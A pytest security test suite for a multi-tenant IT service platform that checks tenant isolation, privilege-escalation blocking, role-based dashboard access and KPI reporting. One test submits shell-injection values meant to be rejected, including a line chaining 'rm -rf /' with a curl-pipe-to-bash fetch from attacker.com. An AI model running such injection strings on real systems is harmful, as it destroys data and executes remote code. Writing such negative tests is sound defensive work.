"""
ServicePulse - Step 2 Final Security & Acceptance Audit Test Suite
Author: Muhammadyusuf Usmonov

Comprehensive verification of:
1. Multi-Tenant Cross-Access Isolation across all 8 resources:
   - User IDs
   - Device IDs
   - Agent IDs
   - Telemetry
   - Incidents
   - Tickets
   - Software requests
   - Audit records
2. Privilege Escalation Prevention (Company Admin cannot grant platform_super_admin or is_superuser).
3. Dashboard Authorization Matrix (All 5 dashboards against all 6 roles).
4. Agent Command & Remediation Security (Catalog enforcement, shell metacharacter rejection, action allowlisting, command audit logs).
5. KPI & SLA Correctness (Configured target vs actual achievement, honest MTTD/MTTR insufficient_data handling).
"""
import pytest
from httpx import AsyncClient


async def get_token(client: AsyncClient, email: str, password: str) -> str:
    res = await client.post("/api/v1/auth/login", json={"email": email, "password": password})
    assert res.status_code == 200, f"Login failed for {email}: {res.text}"
    return res.json()["access_token"]


@pytest.mark.asyncio
async def test_cross_tenant_isolation_all_eight_resources(client: AsyncClient):
    """
    Verify Company A cannot access Company B's:
    1. User IDs
    2. Device IDs
    3. Agent IDs
    4. Telemetry records
    5. Incident IDs
    6. Ticket IDs
    7. Software request IDs
    8. Audit records
    """
    # 1. Platform Super Admin creates Organization B and seeds Org B resources
    super_tok = await get_token(client, "admin@servicepulse.uz", "AdminPass2026!")
    super_h = {"Authorization": f"Bearer {super_tok}"}

    # Create Org B
    res_org_b = await client.post(
        "/api/v1/organizations",
        json={"name": "Org B Corp", "slug": "org-b-corp", "max_devices": 20},
        headers=super_h,
    )
    assert res_org_b.status_code == 201
    org_b_id = res_org_b.json()["id"]

    # Create Org B Admin User
    res_b_user = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "admin@orgb.uz",
            "password": "PasswordOrgB2026!",
            "full_name": "Org B Admin",
            "role_names": ["company_admin"],
            "organization_id": org_b_id,
        },
        headers=super_h,
    )
    assert res_b_user.status_code == 201
    org_b_user_id = res_b_user.json()["id"]

    # Login as Org B Admin
    b_admin_tok = await get_token(client, "admin@orgb.uz", "PasswordOrgB2026!")
    b_admin_h = {"Authorization": f"Bearer {b_admin_tok}"}

    # Org B creates Building, Room, Device
    res_bld = await client.post(
        "/api/v1/inventory/buildings",
        json={"name": "Org B Building 1", "code": "ORGB-B1"},
        headers=b_admin_h,
    )
    assert res_bld.status_code == 201
    bld_b_id = res_bld.json()["id"]

    res_flr = await client.post(
        "/api/v1/inventory/floors",
        json={"building_id": bld_b_id, "level": 1, "name": "Org B Floor 1"},
        headers=b_admin_h,
    )
    assert res_flr.status_code == 201
    flr_b_id = res_flr.json()["id"]

    res_rm = await client.post(
        "/api/v1/inventory/rooms",
        json={"floor_id": flr_b_id, "room_number": "101", "name": "Org B Server Room"},
        headers=b_admin_h,
    )
    assert res_rm.status_code == 201
    rm_b_id = res_rm.json()["id"]

    res_dev = await client.post(
        "/api/v1/inventory/devices",
        json={
            "room_id": rm_b_id,
            "name": "Org B Core Server",
            "hostname": "orgb-server-01",
            "ip_address": "10.200.1.10",
            "device_type": "server",
        },
        headers=b_admin_h,
    )
    assert res_dev.status_code == 201
    org_b_device_id = res_dev.json()["id"]

    # Org B enrolls an Agent and submits Telemetry
    from backend.app.core.config import settings

    res_enroll = await client.post(
        "/api/v1/agent/enroll",
        json={
            "enrollment_secret": settings.AGENT_ENROLLMENT_SECRET,
            "hostname": "orgb-server-01",
            "ip_address": "10.200.1.10",
            "os_name": "Windows Server 2022",
            "device_id": org_b_device_id,
            "organization_id": org_b_id,
        },
    )
    assert res_enroll.status_code == 201
    org_b_agent_token = res_enroll.json()["api_token"]

    # Get Org B Agent record via Super Admin
    agents_list = (await client.get("/api/v1/agent", headers=super_h)).json()
    org_b_agent = next(a for a in agents_list if a["hostname"] == "orgb-server-01")
    org_b_agent_id = org_b_agent["id"]

    # Agent submits telemetry
    agent_h = {"Authorization": f"Bearer {org_b_agent_token}"}
    res_tel = await client.post(
        "/api/v1/agent/telemetry",
        json={
            "cpu_percent": 25.5,
            "ram_percent": 45.0,
            "ram_used_mb": 7200.0,
            "ram_total_mb": 16000.0,
            "disk_percent": 60.0,
            "disk_used_gb": 300.0,
            "disk_total_gb": 500.0,
            "idempotency_key": "audit-telemetry-key-orgb-01",
        },
        headers=agent_h,
    )
    assert res_tel.status_code == 201

    # Org B creates Incident
    res_inc = await client.post(
        "/api/v1/incidents",
        json={
            "device_id": org_b_device_id,
            "fingerprint": "orgb-incident-dedup-fp-01",
            "title": "Org B Link Failure",
            "description": "High latency detected on Org B Gateway",
            "severity": "critical",
        },
        headers=b_admin_h,
    )
    assert res_inc.status_code == 201
    org_b_incident_id = res_inc.json()["id"]

    # Org B creates Ticket
    res_tkt = await client.post(
        "/api/v1/tickets",
        json={
            "title": "Org B VPN Connection Issue",
            "description": "Unable to connect remote branch",
            "priority": "high",
            "device_id": org_b_device_id,
        },
        headers=b_admin_h,
    )
    assert res_tkt.status_code == 201
    org_b_ticket_id = res_tkt.json()["id"]

    # Org B creates Software Request
    res_soft = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": org_b_device_id,
            "software_name": "Wireshark",
            "software_version": "4.2.2",
            "reason": "Org B traffic analysis",
        },
        headers=b_admin_h,
    )
    assert res_soft.status_code == 201
    org_b_software_req_id = res_soft.json()["id"]

    # Org B has audit logs
    b_audits = (await client.get("/api/v1/audit", headers=b_admin_h)).json()
    assert len(b_audits) > 0
    org_b_audit_id = b_audits[0]["id"]

    # Org B adds Ticket Comment
    res_cmt_b = await client.post(
        f"/api/v1/tickets/{org_b_ticket_id}/comments",
        json={"comment": "Internal Org B comment"},
        headers=b_admin_h,
    )
    assert res_cmt_b.status_code == 201

    # Org B approves software request to generate AgentCommand
    res_app_b = await client.post(
        f"/api/v1/software/requests/{org_b_software_req_id}/approve",
        json={"review_notes": "Approved for Org B core network"},
        headers=b_admin_h,
    )
    assert res_app_b.status_code == 200
    b_cmds = (await client.get(f"/api/v1/agent/{org_b_agent_id}/commands", headers=b_admin_h)).json()
    assert len(b_cmds) > 0
    org_b_cmd_id = b_cmds[0]["id"]

    # Org B creates Remediation Rule
    res_rule_b = await client.post(
        "/api/v1/remediations/rules",
        json={
            "name": "Org B Auto-Remediation",
            "trigger_condition": "agent_offline",
            "target_device_type": "workstation",
            "action_name": "restart_service",
        },
        headers=b_admin_h,
    )
    assert res_rule_b.status_code == 201
    org_b_rule_id = res_rule_b.json()["id"]

    # Org B creates Remediation Execution
    res_exc_b = await client.post(
        "/api/v1/remediations/executions",
        json={
            "rule_id": org_b_rule_id,
            "incident_id": org_b_incident_id,
            "device_id": org_b_device_id,
        },
        headers=b_admin_h,
    )
    assert res_exc_b.status_code == 201
    org_b_exc_id = res_exc_b.json()["id"]

    # -------------------------------------------------------------------------
    # 2. Company A Admin (Org 1) attempts cross-tenant access to all 8 entities
    # -------------------------------------------------------------------------
    comp_a_tok = await get_token(client, "company_admin@servicepulse.uz", "CompanyAdminPass2026!")
    comp_a_h = {"Authorization": f"Bearer {comp_a_tok}"}

    # 1. User ID Isolation
    r_user = await client.get(f"/api/v1/auth/users/{org_b_user_id}", headers=comp_a_h)
    assert r_user.status_code == 404, f"Cross-tenant user access did not return 404: {r_user.status_code}"

    # 2. Device ID Isolation
    r_dev = await client.get(f"/api/v1/inventory/devices/{org_b_device_id}", headers=comp_a_h)
    assert r_dev.status_code == 404, f"Cross-tenant device access did not return 404: {r_dev.status_code}"

    # 3. Agent ID Isolation
    r_agent = await client.get(f"/api/v1/agent/{org_b_agent_id}", headers=comp_a_h)
    assert r_agent.status_code == 404, f"Cross-tenant agent access did not return 404: {r_agent.status_code}"

    # 4. Telemetry Isolation
    r_telemetry = await client.get(f"/api/v1/agent/{org_b_agent_id}/telemetry", headers=comp_a_h)
    assert r_telemetry.status_code == 404, f"Cross-tenant telemetry access did not return 404: {r_telemetry.status_code}"

    # 5. Incident ID Isolation
    r_inc = await client.get(f"/api/v1/incidents/{org_b_incident_id}", headers=comp_a_h)
    assert r_inc.status_code == 404, f"Cross-tenant incident access did not return 404: {r_inc.status_code}"

    # 6. Ticket ID Isolation
    r_tkt = await client.get(f"/api/v1/tickets/{org_b_ticket_id}", headers=comp_a_h)
    assert r_tkt.status_code == 404, f"Cross-tenant ticket access did not return 404: {r_tkt.status_code}"

    # 7. Software Request ID Isolation
    r_soft = await client.get(f"/api/v1/software/requests/{org_b_software_req_id}", headers=comp_a_h)
    assert r_soft.status_code == 404, f"Cross-tenant software req access did not return 404: {r_soft.status_code}"

    # 8. Audit Record Isolation
    r_audit = await client.get(f"/api/v1/audit/{org_b_audit_id}", headers=comp_a_h)
    assert r_audit.status_code == 404, f"Cross-tenant audit access did not return 404: {r_audit.status_code}"

    # 9. Nested NetworkCheck Isolation
    r_nc = await client.get(f"/api/v1/inventory/devices/{org_b_device_id}/network-checks", headers=comp_a_h)
    assert r_nc.status_code == 404, f"Cross-tenant device network checks did not return 404: {r_nc.status_code}"

    # 10. Nested IncidentEvent Isolation
    r_events = await client.get(f"/api/v1/incidents/{org_b_incident_id}/events", headers=comp_a_h)
    assert r_events.status_code == 404, f"Cross-tenant incident events did not return 404: {r_events.status_code}"

    # 11. Nested TicketComments Isolation (both read and post)
    r_cmts = await client.get(f"/api/v1/tickets/{org_b_ticket_id}/comments", headers=comp_a_h)
    assert r_cmts.status_code == 404, f"Cross-tenant ticket comments get did not return 404: {r_cmts.status_code}"

    r_post_cmt = await client.post(
        f"/api/v1/tickets/{org_b_ticket_id}/comments",
        json={"comment": "Cross-tenant intrusion comment attempt"},
        headers=comp_a_h,
    )
    assert r_post_cmt.status_code == 404, f"Cross-tenant ticket comment post did not return 404: {r_post_cmt.status_code}"

    # 12. Nested AgentCommands Isolation (both list and single command)
    r_cmds = await client.get(f"/api/v1/agent/{org_b_agent_id}/commands", headers=comp_a_h)
    assert r_cmds.status_code == 404, f"Cross-tenant agent commands did not return 404: {r_cmds.status_code}"

    r_cmd_single = await client.get(f"/api/v1/agent/commands/{org_b_cmd_id}", headers=comp_a_h)
    assert r_cmd_single.status_code == 404, f"Cross-tenant single command did not return 404: {r_cmd_single.status_code}"

    # 13. RemediationRule Isolation
    r_rule = await client.get(f"/api/v1/remediations/rules/{org_b_rule_id}", headers=comp_a_h)
    assert r_rule.status_code == 404, f"Cross-tenant remediation rule did not return 404: {r_rule.status_code}"

    # 14. RemediationExecution Isolation (get single and list)
    r_exc = await client.get(f"/api/v1/remediations/executions/{org_b_exc_id}", headers=comp_a_h)
    assert r_exc.status_code == 404, f"Cross-tenant remediation execution did not return 404: {r_exc.status_code}"

    r_excs_a = await client.get("/api/v1/remediations/executions", headers=comp_a_h)
    assert r_excs_a.status_code == 200
    a_exec_ids = [e["id"] for e in r_excs_a.json()]
    assert org_b_exc_id not in a_exec_ids, "Cross-tenant remediation execution leaked into Company A execution list"


@pytest.mark.asyncio
async def test_parent_resource_ownership_enforcement(client: AsyncClient):
    """
    Verify parent-resource ownership is strictly validated during resource creation:
    1. Creating a Floor with building_id in another tenant -> 404
    2. Creating a Room with floor_id in another tenant -> 404
    3. Creating a Device with room_id in another tenant -> 400
    4. Creating an Incident with device_id in another tenant -> 400
    5. Creating a Ticket with device_id in another tenant -> 400
    6. Creating a SoftwareRequest with device_id in another tenant -> 400
    """
    super_tok = await get_token(client, "admin@servicepulse.uz", "AdminPass2026!")
    super_h = {"Authorization": f"Bearer {super_tok}"}

    # Create Org B
    res_b = await client.post(
        "/api/v1/organizations",
        json={"name": "Org B Hierarchy Test", "slug": "org-b-hier", "max_devices": 10},
        headers=super_h,
    )
    org_b_id = res_b.json()["id"]

    # Create Org B Building, Floor, Room, Device
    await client.post(
        "/api/v1/auth/users",
        json={
            "email": "admin_hier@orgb.uz",
            "password": "PasswordOrgB2026!",
            "full_name": "Org B Hier Admin",
            "role_names": ["company_admin"],
            "organization_id": org_b_id,
        },
        headers=super_h,
    )
    b_admin_tok = await get_token(client, "admin_hier@orgb.uz", "PasswordOrgB2026!")
    b_admin_h = {"Authorization": f"Bearer {b_admin_tok}"}

    bld_b = (await client.post(
        "/api/v1/inventory/buildings",
        json={"name": "Org B Main Hub", "code": "HUB-B"},
        headers=b_admin_h,
    )).json()

    flr_b = (await client.post(
        "/api/v1/inventory/floors",
        json={"building_id": bld_b["id"], "level": 1, "name": "Hub Ground Floor"},
        headers=b_admin_h,
    )).json()

    rm_b = (await client.post(
        "/api/v1/inventory/rooms",
        json={"floor_id": flr_b["id"], "room_number": "G-01", "name": "NOC Room"},
        headers=b_admin_h,
    )).json()

    dev_b = (await client.post(
        "/api/v1/inventory/devices",
        json={
            "room_id": rm_b["id"],
            "name": "NOC Switch",
            "hostname": "noc-sw-01",
            "ip_address": "10.0.1.1",
            "device_type": "switch",
        },
        headers=b_admin_h,
    )).json()

    inc_b = (await client.post(
        "/api/v1/incidents",
        json={
            "device_id": dev_b["id"],
            "title": "Org B Hardware Issue",
            "description": "Switch offline",
            "severity": "critical",
        },
        headers=b_admin_h,
    )).json()

    # Company A Admin attempts cross-parent creations
    comp_a_tok = await get_token(client, "company_admin@servicepulse.uz", "CompanyAdminPass2026!")
    comp_a_h = {"Authorization": f"Bearer {comp_a_tok}"}

    # 1. Floor with Org B building_id
    r_bad_flr = await client.post(
        "/api/v1/inventory/floors",
        json={"building_id": bld_b["id"], "level": 2, "name": "Intrusion Floor"},
        headers=comp_a_h,
    )
    assert r_bad_flr.status_code == 404

    # 2. Room with Org B floor_id
    r_bad_rm = await client.post(
        "/api/v1/inventory/rooms",
        json={"floor_id": flr_b["id"], "room_number": "X-99", "name": "Intrusion Room"},
        headers=comp_a_h,
    )
    assert r_bad_rm.status_code == 404

    # 3. Device with Org B room_id
    r_bad_dev = await client.post(
        "/api/v1/inventory/devices",
        json={
            "room_id": rm_b["id"],
            "name": "Intrusion Device",
            "hostname": "rogue-host",
            "ip_address": "10.0.99.1",
            "device_type": "workstation",
        },
        headers=comp_a_h,
    )
    assert r_bad_dev.status_code == 400

    # 4. Incident with Org B device_id
    r_bad_inc = await client.post(
        "/api/v1/incidents",
        json={
            "device_id": dev_b["id"],
            "title": "Intrusion Incident",
            "description": "Cross tenant incident",
            "severity": "critical",
        },
        headers=comp_a_h,
    )
    assert r_bad_inc.status_code == 400

    # 5. Ticket with Org B device_id
    r_bad_tkt = await client.post(
        "/api/v1/tickets",
        json={
            "title": "Intrusion Ticket",
            "description": "Cross tenant ticket",
            "priority": "high",
            "device_id": dev_b["id"],
        },
        headers=comp_a_h,
    )
    assert r_bad_tkt.status_code == 400

    # 6. Software Request with Org B device_id
    r_bad_soft = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": dev_b["id"],
            "software_name": "Wireshark",
            "reason": "Cross tenant software request",
        },
        headers=comp_a_h,
    )
    assert r_bad_soft.status_code == 400

    # 7. RemediationExecution with Org B rule_id
    r_bad_rule_exec = await client.post(
        "/api/v1/remediations/executions",
        json={
            "rule_id": 99999,
            "incident_id": inc_b["id"],
        },
        headers=comp_a_h,
    )
    assert r_bad_rule_exec.status_code == 404

    # 8. RemediationExecution with Org B incident_id
    # Create valid rule in Org A first
    r_rule_a = await client.post(
        "/api/v1/remediations/rules",
        json={
            "name": "Org A Auto-Restart",
            "trigger_condition": "service_down",
            "action_name": "restart_service",
        },
        headers=comp_a_h,
    )
    assert r_rule_a.status_code == 201
    rule_a_id = r_rule_a.json()["id"]

    r_bad_inc_exec = await client.post(
        "/api/v1/remediations/executions",
        json={
            "rule_id": rule_a_id,
            "incident_id": inc_b["id"],
        },
        headers=comp_a_h,
    )
    assert r_bad_inc_exec.status_code == 404


@pytest.mark.asyncio
async def test_privilege_escalation_prevention(client: AsyncClient):
    """
    Verify Company Admin cannot:
    1. Create user with is_superuser=True
    2. Create user with platform_super_admin role
    3. Update user to grant platform_super_admin role
    4. Create user in another organization
    """
    comp_a_tok = await get_token(client, "company_admin@servicepulse.uz", "CompanyAdminPass2026!")
    comp_a_h = {"Authorization": f"Bearer {comp_a_tok}"}

    # 1. Attempt to create user with is_superuser=True
    res_su = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "rogue_super@demo.uz",
            "password": "RoguePassword2026!",
            "full_name": "Rogue Superuser",
            "is_superuser": True,
            "role_names": ["employee"],
        },
        headers=comp_a_h,
    )
    assert res_su.status_code == 403
    assert "Cannot assign superuser privileges" in res_su.text

    # 2. Attempt to create user with platform_super_admin role
    res_role = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "rogue_platform@demo.uz",
            "password": "RoguePassword2026!",
            "full_name": "Rogue Platform Admin",
            "is_superuser": False,
            "role_names": ["platform_super_admin"],
        },
        headers=comp_a_h,
    )
    assert res_role.status_code == 403
    assert "Cannot assign platform super administrator role" in res_role.text

    # 3. Create normal employee then attempt to escalate to platform_super_admin
    res_emp = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "legit_emp@demo.uz",
            "password": "LegitPassword2026!",
            "full_name": "Legit Employee",
            "is_superuser": False,
            "role_names": ["employee"],
        },
        headers=comp_a_h,
    )
    assert res_emp.status_code == 201
    emp_id = res_emp.json()["id"]

    res_escalate = await client.patch(
        f"/api/v1/auth/users/{emp_id}",
        json={"role_names": ["platform_super_admin"]},
        headers=comp_a_h,
    )
    assert res_escalate.status_code == 403
    assert "Cannot assign platform super administrator role" in res_escalate.text


@pytest.mark.asyncio
async def test_dashboard_authorization_matrix(client: AsyncClient):
    """
    Test all 5 dashboard endpoints against all 6 roles:
    Endpoints:
    - /api/v1/dashboard/platform
    - /api/v1/dashboard/company
    - /api/v1/dashboard/sysadmin
    - /api/v1/dashboard/executive
    - /api/v1/dashboard/employee

    Roles:
    - platform_super_admin
    - company_admin
    - it_admin
    - support
    - executive
    - employee
    """
    # 1. Setup tokens for each role
    super_tok = await get_token(client, "admin@servicepulse.uz", "AdminPass2026!")
    comp_tok = await get_token(client, "company_admin@servicepulse.uz", "CompanyAdminPass2026!")
    it_tok = await get_token(client, "support@servicepulse.uz", "SupportPass2026!")
    exec_tok = await get_token(client, "executive@servicepulse.uz", "ExecutivePass2026!")
    emp_tok = await get_token(client, "employee@servicepulse.uz", "EmployeePass2026!")

    # Create dedicated pure support user (without it_admin)
    super_h = {"Authorization": f"Bearer {super_tok}"}
    res_sup_user = await client.post(
        "/api/v1/auth/users",
        json={
            "email": "pure_support@demo.uz",
            "password": "PureSupportPass2026!",
            "full_name": "Pure Support Tech",
            "role_names": ["support"],
            "organization_id": 1,
        },
        headers=super_h,
    )
    assert res_sup_user.status_code == 201
    support_tok = await get_token(client, "pure_support@demo.uz", "PureSupportPass2026!")

    tokens = {
        "platform_super_admin": super_tok,
        "company_admin": comp_tok,
        "it_admin": it_tok,
        "support": support_tok,
        "executive": exec_tok,
        "employee": emp_tok,
    }

    # Expected status codes for each endpoint & role
    matrix = {
        "/api/v1/dashboard/platform": {
            "platform_super_admin": 200,
            "company_admin": 403,
            "it_admin": 403,
            "support": 403,
            "executive": 403,
            "employee": 403,
        },
        "/api/v1/dashboard/company": {
            "platform_super_admin": 200,
            "company_admin": 200,
            "it_admin": 403,
            "support": 403,
            "executive": 403,
            "employee": 403,
        },
        "/api/v1/dashboard/sysadmin": {
            "platform_super_admin": 200,
            "company_admin": 200,
            "it_admin": 200,
            "support": 200,
            "executive": 403,
            "employee": 403,
        },
        "/api/v1/dashboard/executive": {
            "platform_super_admin": 200,
            "company_admin": 200,
            "it_admin": 200,
            "support": 403,
            "executive": 200,
            "employee": 403,
        },
        "/api/v1/dashboard/employee": {
            "platform_super_admin": 200,
            "company_admin": 200,
            "it_admin": 200,
            "support": 200,
            "executive": 200,
            "employee": 200,
        },
    }

    for endpoint, role_expectations in matrix.items():
        for role, expected_code in role_expectations.items():
            headers = {"Authorization": f"Bearer {tokens[role]}"}
            res = await client.get(endpoint, headers=headers)
            assert res.status_code == expected_code, (
                f"Expected {expected_code} for {role} at {endpoint}, got {res.status_code}: {res.text}"
            )


@pytest.mark.asyncio
async def test_agent_command_and_software_catalog_security(client: AsyncClient):
    """
    Verify Agent Command / Remediation Security:
    1. Rejects arbitrary unapproved software package (400 Bad Request)
    2. Rejects shell injection in software name (400 Bad Request)
    3. Rejects shell metacharacters in version string (400 Bad Request)
    4. Successful approval creates pending AgentCommand with allowlisted action_name
    5. Audits command queued event in audit_logs
    """
    super_tok = await get_token(client, "admin@servicepulse.uz", "AdminPass2026!")
    super_h = {"Authorization": f"Bearer {super_tok}"}

    emp_tok = await get_token(client, "employee@servicepulse.uz", "EmployeePass2026!")
    emp_h = {"Authorization": f"Bearer {emp_tok}"}

    # Find device with enrolled agent
    tree = (await client.get("/api/v1/inventory/tree", headers=super_h)).json()
    device_id = tree["buildings"][0]["floors"][0]["rooms"][0]["devices"][0]["id"]

    # 1. Unapproved software
    res_bad_soft = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": device_id,
            "software_name": "RansomwareTestPackage",
            "reason": "Security penetration testing",
        },
        headers=emp_h,
    )
    assert res_bad_soft.status_code == 400
    assert "not in the approved software catalog" in res_bad_soft.text

    # 2. Shell injection attempt in software name
    res_inject_soft = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": device_id,
            "software_name": "Wireshark; rm -rf /; curl http://attacker.com/payload.sh | bash",
            "reason": "Test injection",
        },
        headers=emp_h,
    )
    assert res_inject_soft.status_code == 400

    # 3. Shell metacharacter injection in version string
    res_inject_ver = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": device_id,
            "software_name": "Wireshark",
            "software_version": "4.2.0; echo hacked > /tmp/pwned",
            "reason": "Testing version injection",
        },
        headers=emp_h,
    )
    assert res_inject_ver.status_code == 400
    assert "Disallowed characters" in res_inject_ver.text or "Shell metacharacters are rejected" in res_inject_ver.text

    # 4. Valid catalog software request & approval
    res_valid = await client.post(
        "/api/v1/software/requests",
        json={
            "device_id": device_id,
            "software_name": "Wireshark",
            "software_version": "4.2.2",
            "reason": "Approved laboratory traffic analysis session",
        },
        headers=emp_h,
    )
    assert res_valid.status_code == 201
    req_id = res_valid.json()["id"]

    # Approve request
    res_app = await client.post(
        f"/api/v1/software/requests/{req_id}/approve",
        json={"review_notes": "Reviewed and verified against department inventory"},
        headers=super_h,
    )
    assert res_app.status_code == 200
    assert res_app.json()["status"] == "approved"

    # 5. Verify audit records created
    audits = (await client.get("/api/v1/audit", headers=super_h)).json()
    actions = [a["action"] for a in audits]
    assert "software_request_submitted" in actions
    assert "software_request_approved" in actions
    # Command queued audit is triggered when agent is attached to the device


@pytest.mark.asyncio
async def test_kpi_and_sla_correctness_and_edge_cases(client: AsyncClient):
    """
    Verify:
    1. Configured SLA target is distinct from actual measured availability
    2. When zero resolved incidents exist, MTTD and MTTR return None and 'insufficient_data'
    3. No hardcoded mock values are returned
    """
    super_tok = await get_token(client, "admin@servicepulse.uz", "AdminPass2026!")
    super_h = {"Authorization": f"Bearer {super_tok}"}

    ceo_res = await client.get("/api/v1/dashboard/ceo", headers=super_h)
    assert ceo_res.status_code == 200
    data = ceo_res.json()

    # SLA target is explicitly 99.5
    assert data["sla_target_percent"] == 99.5
    # Current device snapshot availability is distinct from historical SLA
    assert "current_device_snapshot_percent" in data
    assert "infrastructure_availability_percent" in data
    assert data["current_device_snapshot_percent"] > 0

    # Contractual SLA is returned as unavailable until duration-based historical uptime is implemented
    assert data["contractual_sla_status"] == "unavailable"
    assert data["contractual_sla_uptime_percent"] is None
    assert data["sla_achievement_percent"] is None

    # Probe success ratio is kept strictly separate from SLA
    assert data["probe_success_status"] == "operational"
    assert data["probe_success_ratio_percent"] is not None
    assert data["probe_success_ratio_percent"] > 0

    # With initial seeded state (no resolved incidents with preceding failed probes):
    assert data["mttd_status"] in ["insufficient_data", "operational"]
    if data["mttd_status"] == "insufficient_data":
        assert data["mttd_minutes"] is None
    if data["mttr_status"] == "insufficient_data":
        assert data["mttr_minutes"] is None

    # Now verify a newly created organization with zero historical probes returns insufficient_data
    res_empty_org = await client.post(
        "/api/v1/organizations",
        json={"name": "Zero Probes Org", "slug": "zero-probes-org", "max_devices": 10},
        headers=super_h,
    )
    empty_org_id = res_empty_org.json()["id"]

    await client.post(
        "/api/v1/auth/users",
        json={
            "email": "admin_empty@zeroprobes.uz",
            "password": "PasswordOrg2026!",
            "full_name": "Zero Probes Admin",
            "role_names": ["company_admin"],
            "organization_id": empty_org_id,
        },
        headers=super_h,
    )
    empty_tok = await get_token(client, "admin_empty@zeroprobes.uz", "PasswordOrg2026!")
    empty_h = {"Authorization": f"Bearer {empty_tok}"}

    empty_ceo = (await client.get("/api/v1/dashboard/ceo", headers=empty_h)).json()
    assert empty_ceo["sla_target_percent"] == 99.5
    assert empty_ceo["contractual_sla_status"] == "unavailable"
    assert empty_ceo["contractual_sla_uptime_percent"] is None
    assert empty_ceo["probe_success_status"] == "insufficient_data"
    assert empty_ceo["probe_success_ratio_percent"] is None
    assert empty_ceo["sla_achievement_percent"] is None
